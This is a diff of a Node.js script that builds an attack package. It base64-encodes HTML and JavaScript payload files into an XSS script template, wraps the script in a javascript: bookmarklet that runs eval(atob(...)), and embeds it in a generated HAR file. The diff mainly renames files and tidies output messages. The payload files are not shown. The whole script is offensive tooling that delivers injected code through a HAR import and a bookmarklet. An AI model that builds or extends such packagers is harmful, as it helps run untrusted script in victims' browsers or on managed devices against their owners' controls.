@@ -6,33 +6,28 @@ function readAndEncode(filePath) {
   return Buffer.from(content, 'utf-8').toString('base64');
 }
 
-// Corrected path for entry.html
 const entry_b64 = readAndEncode('entry/entry.html');
 const index_html_b64 = readAndEncode('payloads/index.html');
 const index_js_b64 = readAndEncode('payloads/index.js');
 
-// Replace placeholders in xss.js
-let xss = fs.readFileSync('xss.js', 'utf-8')
-  .replace("putentrycontentshere", entry_b64)
-  .replace("putindex.htmlcontentshere", index_html_b64)
-  .replace("putindex.jscontentshere", index_js_b64);
+let autoxss_js = fs.readFileSync('autoxss.js', 'utf-8');
 
-fs.writeFileSync('autoxss.js', xss);
-console.log("✅ Saved updated script as autoxss.js");
+autoxss_js = autoxss_js.replace('putentrycontentshere', entry_b64);
+autoxss_js = autoxss_js.replace('putindex.htmlcontentshere', index_html_b64);
+autoxss_js = autoxss_js.replace('putindex.jscontentshere', index_js_b64);
 
-// Generate HAR
+fs.writeFileSync('xss.js', autoxss_js);
+console.log("\x1b[1m\x1b[32m:D\x1b[0m Built fresh xss.js");
+
 const now = new Date();
 const nowISOString = now.toISOString();
-const base64Code = Buffer.from(xss, 'utf-8').toString('base64');
+const base64Code = Buffer.from(autoxss_js, 'utf-8').toString('base64');
 const bookmarkletUrl = `javascript:(function(){eval(atob("${base64Code}"))})()`;
 
 const har = {
   log: {
     version: "1.2",
-    creator: {
-      name: "NodeJS HarGen",
-      version: "1.0"
-    },
+    creator: { name: "NodeJS HarGen", version: "1.0" },
     pages: [{
       startedDateTime: nowISOString,
       id: "page_1",
@@ -87,9 +82,9 @@ const har = {
         ],
         cookies: [],
         content: {
-          size: xss.length,
+          size: autoxss_js.length,
           mimeType: "application/javascript",
-          text: xss
+          text: autoxss_js
         },
         redirectURL: "",
         headersSize: -1,
@@ -112,7 +107,10 @@ const har = {
   }
 };
 
-const filename = `rigtools.har`;
+const month = String(now.getMonth() + 1).padStart(2, '0');
+const day = String(now.getDate()).padStart(2, '0');
+const year = String(now.getFullYear()).slice(-2);
+const filename = `hartools-${month}|${day}|${year}.har`;
 
 fs.writeFileSync(filename, JSON.stringify(har, null, 2));
-console.log(`✅ HAR file generated: ${filename}`);
+console.log(`\x1b[1m\x1b[32m:D\x1b[0m HAR file generated: ${filename}`);
